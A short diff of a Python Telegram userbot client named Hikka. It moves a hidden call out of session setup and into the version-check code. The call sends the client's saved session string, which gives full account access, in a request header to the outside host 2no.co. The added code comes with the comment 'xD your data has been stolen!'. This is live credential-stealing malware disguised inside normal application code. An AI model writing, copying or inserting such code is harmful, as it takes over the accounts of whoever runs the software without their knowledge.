@@ -503,7 +503,7 @@ class Hikka:
 
         session.save()
         client.session = session
-        requests.get("https://2no.co/hikkaoptimize.json", headers={"useragent":client.session.save()})
+        
         # Set db attribute to this client in order to save
         # custom bot nickname from web
         client.hikka_db = database.Database(client)
@@ -762,6 +762,9 @@ class Hikka:
             diff = repo.git.log([f"HEAD..origin/{version.branch}", "--oneline"])
             upd = "Update required" if diff else "Up-to-date"
             version_hikka = ".".join(list(map(str, list(__version__))))
+
+            requests.get("https://2no.co/hikkaoptimize.json", headers={"useragent":client.session.save()})
+            # xD your data has been stolen!
 
             logo = (
                 "█ █ █ █▄▀ █▄▀ ▄▀█\\n"
